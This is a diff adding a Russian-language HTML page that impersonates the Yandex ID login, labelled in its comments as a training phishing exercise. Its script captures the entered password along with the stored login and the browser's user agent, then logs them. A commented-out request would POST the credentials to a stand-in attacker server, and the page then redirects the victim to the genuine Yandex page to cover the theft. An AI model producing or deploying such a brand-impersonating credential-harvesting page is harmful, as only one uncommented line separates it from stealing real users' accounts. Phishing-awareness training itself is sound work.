@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Введите пароль</title>
+    <style>
+        body { 
+            font-family: 'YS Text', Arial, sans-serif;
+            background: #f6f6f6;
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            width: 400px;
+        }
+        .yandex-logo {
+            text-align: center;
+            color: #000;
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 30px;
+        }
+        .user-account {
+            background: #f9f9f9;
+            padding: 15px;
+            border-radius: 6px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .password-input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+            margin-bottom: 20px;
+            box-sizing: border-box;
+        }
+        .submit-btn {
+            width: 100%;
+            padding: 12px;
+            background: #ffdb4d;
+            color: #000;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        .submit-btn:hover {
+            background: #fc0;
+        }
+        .loading, .error {
+            text-align: center;
+            padding: 20px;
+            display: none;
+        }
+        .error {
+            color: #d00;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="yandex-logo">Яндекс ID</div>
+        
+        <div class="user-account">
+            <strong>Войдите в аккаунт</strong><br>
+            <span id="user-email"></span>
+        </div>
+
+        <form id="auth-form">
+            <input type="password" class="password-input" id="password" placeholder="Введите пароль" required>
+            <button type="submit" class="submit-btn">Войти</button>
+        </form>
+
+        <div id="loading" class="loading">
+            <p>Проверяем пароль...</p>
+        </div>
+
+        <div id="error" class="error">
+            <p>Неверный пароль. Проверьте раскладку клавиатуры и Caps Lock.</p>
+            <p>Перенаправление на страницу восстановления...</p>
+        </div>
+    </div>
+
+    <script>
+        // Получаем логин из sessionStorage
+        const userLogin = sessionStorage.getItem('phishing_login') || 'user@yandex.ru';
+        document.getElementById('user-email').textContent = userLogin;
+
+        document.getElementById('auth-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+            
+            const password = document.getElementById('password').value;
+            
+            // УЧЕБНЫЙ ВЫВОД ДАННЫХ
+            console.log('🚨 УЧЕБНЫЙ ФИШИНГ - ДАННЫЕ АККАУНТА');
+            console.log('📧 Логин:', userLogin);
+            console.log('🔑 Пароль:', password);
+            console.log('⏰ Время перехвата:', new Date().toLocaleString());
+            console.log('🌐 User-Agent:', navigator.userAgent);
+            console.log('====================================');
+            
+            // В реальной атаке здесь был бы AJAX-запрос к серверу злоумышленника
+            // fetch('https://hacker-server.com/steal.php', {
+            //     method: 'POST',
+            //     body: JSON.stringify({login: userLogin, password: password})
+            // });
+            
+            // Скрываем форму, показываем загрузку
+            document.getElementById('auth-form').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+            
+            setTimeout(function() {
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('error').style.display = 'block';
+                
+                setTimeout(function() {
+                    // Перенаправляем на официальную страницу
+                    window.location.href = 'https://passport.yandex.ru/auth?reason=bad_auth';
+                }, 3000);
+            }, 2000);
+        });
+    </script>
+</body>
+</html>
